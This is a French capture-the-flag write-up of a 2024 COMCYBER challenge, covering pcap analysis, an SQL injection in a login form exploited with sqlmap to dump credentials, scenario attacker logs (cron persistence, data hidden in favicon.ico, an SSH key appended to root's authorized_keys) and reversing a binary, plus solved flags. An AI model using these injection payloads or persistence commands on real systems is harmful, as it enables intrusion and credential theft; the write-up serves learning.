view: writeup
language: en
seo:
  title: Capture The Flags, COMCYBER challenges
  description: Mettez vos comp√©tences en cybers√©curit√© au service de l'arm√©e de Terre dans un challenge immersif organis√© par le Commandement de la cyberd√©fense.
  keywords: ctf, security, comcyber
  author: Antoine Benevaut
  twitter: "@abenevaut"
  og-image: https://www.abenevaut.dev/seo/abenevaut-og.webp
  url: https://www.abenevaut.dev/2024-comcyber.html

article:
  contentCategory: "Capture The Flags"
  contentTitle: "COMCYBER challenges"
  contentBody: "<p class='mt-6'>
    Missions exceptionnelles, environnement hors du commun : venez d√©couvrir les op√©rations militaires d'un sous-officier cyber.
    6 flags sont √† trouver au total.
    </p>"
  caption: "‚ÄúMettez vos comp√©tences en cybers√©curit√© au service de l'arm√©e de Terre dans un challenge immersif organis√© par le Commandement de la cyberd√©fense.‚Äù"
  captionImage: images/ctf-2024-comcyber.png.webp
  outlink: "https://comcyber.challenges.pro.root-me.org"
  outlinkTitle: "Glissez-vous dans la peau d'un cybercombattant"

#  stats:
#    - { label: 'Score', value: '4/6' }
#    - { label: 'Fun', value: '100%' }

writeup: |+
  # Write-up

  Op√©rateur 10 √† Cyberphantom. Prenez message :

  Nous avons perdu la communication avec un v√©hicule alors que nous sommes en pleine op√©ration.
  Nous avons une suspicion de hacking. J'ai besoin de votre diagnostic afin de r√©tablir la communication avec le v√©hicule dans les plus brefs d√©lais.
  
  Vous trouverez ici les derniers logs de communication entre la station radio et le v√©hicule. Ces informations devraient vous √™tre utiles.
  
  Termin√©.
  
  --------
  
  Cette premiere √©preuve nous met √† disposition un fichier [capture.pcap](https://www.abenevaut.dev/images/ctf-2024-comcyber/capture.pcap) (packet capture).
  
  ## Analyse du fichier capture.pcap
  
  En analysant ce fichier avec Wireshark, on peut parcourir la capture des packets r√©seaux.
  
  Une trame d'√©change attire notre attention.
  
  ```log
  Frame 83: 148 bytes on wire (1184 bits), 148 bytes captured (1184 bits) on interface any, id 0
  
  0000   00 04 00 01 00 06 02 42 0a 0a 00 fe 00 00 08 00   .......B........
  0010   45 00 00 84 ec c4 40 00 40 06 5a d1 0a 0a 00 fe   E.....@.@.Z.....
  0020   a3 ac 44 2a 9a 30 00 17 80 60 6c 5a 89 9a 4f 57   ..D*.0...`lZ..OW
  0030   80 18 01 e9 f3 54 00 00 01 01 08 0a b3 12 b6 84   .....T..........
  0040   b3 39 10 33 65 63 68 6f 20 55 6b 31 37 4e 32 46   .9.3echo Uk17N2F
  0050   6d 5a 6a 4a 68 4e 6a 41 33 59 6a 45 7a 5a 6a 63   mZjJhNjA3YjEzZjc
  0060   7a 59 32 49 77 4f 54 4d 32 5a 6a 6b 32 5a 54 59   zY2IwOTM2Zjk2ZTY
  0070   33 59 6a 49 78 4d 44 49 77 4e 32 46 6c 4d 44 51   3YjIxMDIwN2FlMDQ
  0080   33 4e 58 30 4b 20 3e 20 2f 74 6d 70 2f 73 65 63   3NX0K > /tmp/sec
  0090   72 65 74 0a                                       ret.
  ```
  
  Elle affiche l'utilisation d'une impression de caract√®res vers un fichier `/tmp/secret`.
  
  ```shell
  echo Uk17N2FmZjJhNjA3YjEzZjczY2IwOTM2Zjk2ZTY3YjIxMDIwN2FlMDQ3NX0K > /tmp/secret
  ```
  
  La chaine de caract√®re se r√©v√®le √™tre une chaine encod√©e en base64, une fois d√©cod√©e, nous trouvons notre premier flag.
  
  ```flag
  RM{7aff2a607b13f73cb0936f96e67b210207ae0475}
  ```
  
  Le reste de l'analyse du fichier capture.pcap, met en avant des actions pour se renseigner sur la configuration du serveur.
  [Voir le fichier d'analyse](https://www.abenevaut.dev/images/ctf-2024-comcyber/üîç%20Telnet%20-%20Online%20pcap%20files%20viewer%20for%20analyze%20HTTP,%20DNS,%20other%20network%20traffic.pdf) (service gratuit utilis√©, https://apackets.com)
  
  Le serveur a l'adresse IP suivante 163.172.68.42.
  
  Dans le fichier d'analyse des commandes ex√©cut√©es, une ligne attire notre attention, une commande qui vise √† savoir si le port 5000 est ouvert sur la machine.
  
  ```shell
  netstat -nutelap | grep -i 5000
  ```
  
  La commande n'ayant pas de sortie, nous pouvons en d√©duire que le port 5000 n'est pas ouvert.
  
  Qu'est-ce qui pouvait √™tre recherch√© sur ce port ?

  ## Investigation sur 163.172.68.42 (:5000)

  Confirmons que le port 5000 n'est pas ouvert avec notre propre √©num√©ration des ports du serveur¬†:

  ```shell
  nmap -Pn -sC -sV -O -oN initial
  # on vise l'IP 163.172.68.42
  ```
  
  Le r√©sultat de l'analyse NMAP confirme que le port 5000 est ouvert et qu'il fournit un service HTTP.
  
  ```markdown
  # NMAP partial output
  PORT     STATE    SERVICE VERSION
  5000/tcp open     http    nginx 1.22.1
  ```
  [√ânum√©ration complete](https://www.abenevaut.dev/images/ctf-2024-comcyber/initial.nmap)
  
  Lorsque l'on visite ce service http://163.172.68.42:5000, on d√©couvre une page de login.
  - nous sommes redirig√© vers http://163.172.68.42:5000/login
  - on notera qu'avec edge, on voit directement la page de login, avec d'autres navigateurs, il faut faire l'effort de supprimer des balises html pour voir la page de login (peut √™tre une obfuscation volontaire ?)
  
  Un test rapide de ce formulaire met en evidence une injection SQL possible.
  
  ```markdown
  username = admin
  password = "' or 1=1 --"
  ```
  
  On approfondit l'analyse avec SQLmap.
  - ligne de commande a adapter, le template est [disponible ici](https://www.abenevaut.dev/images/ctf-2024-comcyber/login.template)
  
  ```shell
  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password
  ```
  
  SQLmap confirme la possibilit√© d'injection SQL.
  
  ```log
  [22:57:51] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
  (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
  sqlmap identified the following injection point(s) with a total of 299 HTTP(s) requests:
  ---
  Parameter: #1* ((custom) POST)
  Type: boolean-based blind
  Title: OR boolean-based blind - WHERE or HAVING clause
  Payload: username=test@test.com&password=-1571' OR 4147=4147-- sZBN
  
    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=test@test.com&password=2' OR 2625=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- hnWG
  ---
  [22:57:53] [INFO] the back-end DBMS is SQLite
                      web application technology: Nginx 1.22.1
                      back-end DBMS: SQLite
  ```
  
  On recherche le nom des tables disponibles.
  
  ```shell
  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --tables
  ```
  
  On trouve la table `user`.
  
  ```log
  [22:59:57] [INFO] retrieved: user
  ```
  
  On tente d'exfiltrer les donnees de cette table.
  
  ```shell
  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --dump -T user
  ```

  On obtient le dump qui suit¬†:

  ```sql
  id,password,username
  NULL,RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5},admin
  NULL,MEqvgJqr4W48U7L^eEaR!,alice
  ```
  
  Cette exfiltration r√©v√®le un second flag
  
  ```flag
  RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5}
  ```
  
  Bien qu'on puisse d√©j√† se loguer avec l'injection SQL admin et comme password `"' or 1=1 --"`, nous avons maintenant un identifiant valide.
  - alice / `MEqvgJqr4W48U7L^eEaR!`

  ## Goliath

  Une fois logu√©, nous arrivons sur cette interface¬†:
  
  ![Goliath dashboard](https://www.abenevaut.dev/images/ctf-2024-comcyber/Dashboard%20-%20Personnel%20‚Äì%20Microsoft_%20Edge%2004_09_2024%2012_54_31.png.webp)

  On remarque une liste de vehicule.
  Une fois un vehicule selectionne, des informations sur le vehicule apparaissent.
  
  Pour le v√©hicule GOLIATH, ces informations semblent indisponibles et une zone de contenu avec un bouton permet de r√©cup√©rer des logs.
  [Le fichier de logs](https://www.abenevaut.dev/images/ctf-2024-comcyber/server.log)
  
  > On trouve dans cette meme zone de contenu un bouton "ENABLE COMMUNICATION", qui ouvre une popin avec une identification‚ÄØ; Le formulaire n'a pas eu l'air d'etre exploitable.
  
  ![Goliath](https://www.abenevaut.dev/images/ctf-2024-comcyber/Dashboard%20-%20Personnel%20‚Äì%20Microsoft‚Äã%20Edge%2026_09_2024%2017_50_46.png.webp)
  
  Apres investigation, le fichier r√©v√®le une commande avec une chaine de caract√®res encod√©e en hexadecimal qui doit √™tre ajout√©e √† la crontab du serveur.
  
  ```log
  Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -) [0]
  ```
  
  Une fois d√©cod√©, on obtient un nouveau flag.
  
  ```markdown
  * * * * * echo 'RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}'
  ```
  
  ```flag
  RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}
  ```
  
  ## favicon.ico
  
  En poursuivant l'analyse de ces logs, on trouve une autre commande qui semble √™tre une tentative de recuperation d'un fichier.
  
  ```log
  Aug 27 12:25:02 COMCYBER_SRV root[250822]: CMD(echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' > /tmp/.password) [0]
  Aug 27 12:33:56 COMCYBER_SRV root[250822]: CMD(zip --password $(cat /tmp/.password) secret.zip message.txt m4lw3r3) [0]
  Aug 27 12:38:48 COMCYBER_SRV root[250822]: CMD(cat /app/static/assets/images/favicon.ico ./secret.zip > /app/static/assets/images/favicon.ico) [0]
  ```
  
  Le pirate a tent√© de cacher des informations dans le fichier `favicon.ico`.
  - un fichier message.txt
  - un fichier m4lw3r3

  Le fichier `favicon.ico` a √©t√© exfiltr√© via le lien http://163.172.68.42:5000/static/assets/images/favicon.ico.
  
  Analysons ce fichier.
  Avec les logs precedents, nous savons que le mot de passe du fichier zip est `efa3fb1f409aa622dddd7220ad6567580fb68b68`.
  
  ```shell
  unzip favicon.ico
  cat -e message.txt
  ```
  
  Le fichier message.txt contient un nouveau flag.
  
  ```flag
  RM{6ba43cb5eeab217270e9692e939da5341a82d2ff}
  ```
  
  ```markdown
  /!\
  /!\ On notera que le hacker a laiss√© sa clef SSH sur la machine avant de supprimer ses traces.
  /!\ -> A SUPPRIMER DONC
  /!\
  ```
  
  ```log
  Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo 'ssh-rsa AAAAB3NzKV0CWVq3ngl2ThMYDfPehFMEBggHMwQsFqGYirCYEt+XOQWs5wHEZzhDTRfIR29Vgi3UqWOZ2+ddwq5xmcSMwk6BY+sZVRwxuSvNKXnz0jfrz667poinUJD8LRDAiBujt0fbyNpb8aKqAQxPwvRkWIRuktfZk9vs3zjzFYhQRIhn7geAPFCywOfBJVkUfD9mfYow9pihhKnXSvEB/z81edCzXerGxUQ1ztFXZsZmaS5Th1fPF3Vq0dz7kDNo95TP64qO6NY8PS5vbFgw0bppOlK8a8lNw04Zco7iNKtI90+UAfkgookBcG/TkhMcnqk9YTpt+qli1dD7RcxbNBsJBvWDxQYSsBDYsJsBr36TaVpewxWkiPjfTpsvLJGC7SFNX13msjgOFgzzWlMKUrYvsEqprBr6h3cI30Ql1o5HpbL/M04i9UPf+KpvY5PUBX94QbrOFthV/K1gpi/thkBhFqooT9/tnQiIxw== kali@attacker' >> /root/.ssh/authorized_keys) [0]
  Aug 27 12:38:58 COMCYBER_SRV root[250822]: CMD(rm -rf ./message.txt ./secret.zip ./m4lw3r3) [0]
  Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf /tmp/.password) [0]
  Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null) [0]
  Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf /tmp/hack) [0]
  ```
  
  ## m4lw3r3
  
  Le fichier m4lw3r3 est un fichier binaire (`ELF 64-bit GNU/Linux 3.2.0`).
  Nous pouvons l'ex√©cuter sur une machine d√©di√©e et s√©curis√©e pour voir ce qu'il fait.
  
  L'outil https://any.run/ ne r√©v√®le pas d'action malveillante (pas d'activit√© sur le r√©seau, pas de modification de fichier, pas de modification de registre).
  [L'outil https://www.hybrid-analysis.com ne r√©v√®le rien non plus](https://www.abenevaut.dev/images/ctf-2024-comcyber/Free%20Automated%20Malware%20Analysis%20Service%20-%20powered%20by%20Falcon%20Sandbox.pdf)
  
  Apres la mise en place d'une sandbox Linux/Kali, on peut ex√©cuter le fichier librement.
  
  ```shell
  ./m4lw3r3
  ./m4lw3r3 input1 input2
  ```
  
  La sortie d'ex√©cution est standard et pr√©sente qu'il faut renseigner deux param√®tres au binaire.
  
  Une veine tentative de d√©sassemblage/debug avec GDB n'a rien donnee, le binaire ne semble pas avoir les flags de compilation n√©cessaire.
  
  On continue l'analyse du binaire avec [IDA Free](https://hex-rays.com/ida-free/) qui pr√©sente une cartographie compl√®te du fonctionnement du binaire.
  
  ![input 1](https://www.abenevaut.dev/images/ctf-2024-comcyber/IDA-capture1-flag-input1-Capture%20d‚Äô√©cran%202024-09-25%20√†%2022.33.48.png.webp)
  
  Un premier flag, √† peine masque, est d√©couvert.
  
  ```flag
  RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7}
  ```
  
  Lors d'une nouvelle execution, le binaire confirme le premier argument
  
  ```
  ./m4lw3r3 RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7} input2
  ```
  
  ## Input2, OpenSSL ?
  
  Malheureusement, je n'ai pas trop persever√© sur le dernier flag, faute de temps et de comp√©tence.
  
  N√©anmoins, une piste s'est d√©gag√© au fil de l'analyse.
  
  De ce qui est indiqu√© par mon stagiaire (ChatGPT) sur l'analyse de l'assembleur du binaire `m4lw3r3`, l'input2 ferait 128 caract√®res (en octets ? en bytes ?).
  De ce que je comprends de la suite de l'√©preuve est : que l'on doit trouver ce dernier param√®tre, g√©n√©r√© et/ou confirm√© par un algorithme (OpenSSL ? RSA ?).

  Ces param√®tres doivent ensuite permettre de d√©chiffrer la chaine qui suit, comme r√©v√®le dans le binaire, s'agit-il du dernier flag ?
  
  ```log
  puts(
  "You should be able to decrypt this: 0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c598173f31415ff710696318"
  "d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb30a5d480cf4e34339c5e06acc76574cfbea08a4fc"
  "a2c73388b4e08831f8e037489092346809d7c164ab270a5e04ae40a327c99590da89025ac48aa5"
  );
  
  // 0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c598173f31415ff710696318d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb30a5d480cf4e34339c5e06acc76574cfbea08a4fca2c73388b4e08831f8e037489092346809d7c164ab270a5e04ae40a327c99590da89025ac48aa5
  ```
  
  ![hexa m4lw3r3](https://www.abenevaut.dev/images/ctf-2024-comcyber/hexa%20-%20m4lw3r3%2026_09_2024%2014_21_56.png.webp)
  
  Durant l'investigation, j'ai d√©couvert l'outil en ligne https://dogbolt.org qui permet de d√©sassembler en ligne avec plusieurs outils concurrents, mais compl√©mentaires.
  Deux (Dewolf et RetDec) m'ont permis d'√©mettre des hypoth√®ses sur la r√©solution de ce dernier challenge.

  Dewolf d√©sassemble en C et RetDec en C++, j'aurais pu profiter des codes g√©n√©r√©s pour :
    - renommer les variables et fonctions avec des noms claires pour √©claircir le contexte
    - copier et compiler le code dans un environment de d√©veloppement et debugger
    - essayer de disposer le code dans le sens inverse d'ex√©cution pour identifier les √©l√©ments manquants

  Mais peut-√™tre ai-je manqu√© ce dernier flag ailleurs...
  
  ## Conclusion
  
  Tr√®s sympa de r√©aliser ses challenges en condition r√©elle.
  Cet exercice m'a permis de valider mes acquis suite √† ma reprise des challenges sur [root-me.org](https://www.root-me.org/abenevaut?inc=score&lang=fr) et les CTFs FCSC, 404 CTF et https://star.hackademint.org.
  
  Je suis ravi qu'il n'y ait pas eu d'OSINT, le challenge aurait pu s'arr√™ter beaucoup plus t√¥t pour moi.
  
  Merci aux √©quipes qui ont organis√© cet √©v√©nement.
  
  ```flags
  RM{7aff2a607b13f73cb0936f96e67b210207ae0475}
  RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5}
  RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}
  RM{6ba43cb5eeab217270e9692e939da5341a82d2ff}
  RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7}
  ```
